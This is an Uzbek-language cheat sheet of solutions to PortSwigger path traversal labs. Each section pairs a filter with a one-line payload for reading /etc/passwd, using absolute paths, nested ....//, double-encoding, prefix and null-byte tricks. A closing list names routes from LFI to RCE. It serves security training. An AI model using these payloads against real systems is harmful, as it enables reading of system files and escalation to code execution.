# Path Traversal / LFI — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Nishon odatda product image: `GET /image?filename=...`.
> Maqsad: `/etc/passwd` o'qish. Har bir lab = bitta filtr + uning bypass'i.

### Simple case — APPRENTICE
Filtr yo'q.
```
filename=../../../etc/passwd
```

### Traversal blocked, absolute path bypass — APPRENTICE
`../` bloklangan, lekin absolute path ishlaydi.
```
filename=/etc/passwd
```

### Sequences stripped non-recursively — APPRENTICE
`../` bir marta o'chiriladi → ichiga joylab qolasan.
```
filename=....//....//....//etc/passwd
```
> `....//` dan ichki `../` olinadi, tashqi `..` + `/` qoladi.

### Superfluous URL-decode — APPRENTICE
Server qo'shimcha bir marta URL-decode qiladi → double-encode.
```
filename=..%252f..%252f..%252fetc/passwd
```
> `%252f` → `%2f` → `/`.

### Validation of start of path — APPRENTICE
Path kutilgan papkadan boshlanishi kerak → papkani qo'yib, keyin traversal.
```
filename=/var/www/images/../../../etc/passwd
```

### Validate file extension, null byte bypass — APPRENTICE
`.png` bilan tugashi kerak → null byte bilan kesasan.
```
filename=../../../etc/passwd%00.png
```

---

### Eslatma
Bypass arsenali (README'da to'liq): absolute path, `....//`, double-encode (`%252f`),
null byte (`%00`), expected-prefix, UTF-8 overlong. LFI → RCE: php://filter, log poisoning,
`.user.ini`/`.htaccess`, `data://` (bu papka README). Himoya: canonicalize + allowlist.
